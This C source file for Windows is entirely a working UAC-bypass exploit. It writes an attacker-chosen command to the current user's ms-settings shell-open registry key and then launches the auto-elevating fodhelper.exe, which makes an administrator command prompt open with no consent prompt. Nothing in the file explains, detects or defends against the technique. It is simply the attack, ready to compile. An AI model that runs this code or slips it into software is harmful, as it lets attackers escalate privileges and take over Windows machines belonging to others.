#include <stdio.h>
#include <windows.h>

int main (){

    HKEY hregistryKey;

    const char *regkeyname = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
    const char *regkeycommandvalue = "cmd /c start C:\\Windows\\System32\\cmd.exe";
    const char *deligateExecute = "";

    // open regkey & get handle, write to hregistryKey
    RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR)regkeyname, 0, NULL, 0, KEY_WRITE, NULL, &hregistryKey, NULL);

    // set value & close the handle
    RegSetValueEx(hregistryKey, "", 0, REG_SZ, (unsigned char*)regkeycommandvalue, strlen(regkeycommandvalue));
    RegSetValueEx(hregistryKey, "DelegateExecute", 0, REG_SZ, (unsigned char*)deligateExecute, strlen(deligateExecute));

    RegCloseKey(hregistryKey);

    // Run the fodhelper
    SHELLEXECUTEINFO executefodhelper = {sizeof(executefodhelper)};

    executefodhelper.lpVerb = "runas";
    executefodhelper.lpFile = "C:\\Windows\\System32\\fodhelper.exe";
    executefodhelper.hwnd = NULL;
    executefodhelper.nShow = SW_NORMAL;

    ShellExecuteEx(&executefodhelper);

    return 0;

}